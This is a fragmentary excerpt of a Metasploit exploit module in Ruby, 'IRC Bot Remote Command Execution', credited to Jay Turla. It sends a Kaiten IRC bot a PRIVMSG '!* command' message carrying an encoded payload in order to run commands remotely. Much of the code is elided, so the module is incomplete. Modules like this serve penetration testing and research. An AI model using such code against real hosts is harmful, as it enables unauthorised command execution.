...
class MetasploitModule < Msf::Exploit::Remote
  ...
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'IRC Bot  Remote Command Execution',
      'Description'    => %q{
          This module exploits the remote command execution vulnerability on the IRC Bot.
        },
      'Author'         =>
        [
          'Jay Turla'
  ...
  def kaiten_command(sock)
    ...
    command_msg = "PRIVMSG #{datastore['CHANNEL']} :!* command #{encoded}\r\n"
  ...
  def exploit
    ...
    print_status("#{peer} - Exploiting the IRC bot...")
    kaiten_command(sock)
